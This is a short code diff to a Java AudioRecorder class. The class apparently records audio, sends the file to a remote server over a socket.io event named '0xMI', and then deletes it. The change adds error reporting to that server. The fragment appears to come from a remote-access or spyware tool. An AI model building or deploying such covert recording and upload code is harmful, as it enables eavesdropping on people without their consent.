@@ -53,7 +53,7 @@ public  class AudioRecorder {
             object.put("file",true);
             object.put("name","true");
             object.put("buffer" , "starterd recoding");
-        IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
+            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
         }
         catch(Exception e){
             JSONObject object = new JSONObject();
@@ -120,7 +120,11 @@ public  class AudioRecorder {
                 sendFileAndDelete(audiFile);
                 }
                 catch(Exception e){
-
+            JSONObject object = new JSONObject();
+            object.put("file",true);
+            object.put("name","true");
+            object.put("buffer" , e.getMessage());
+            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
                 }
                 
             }
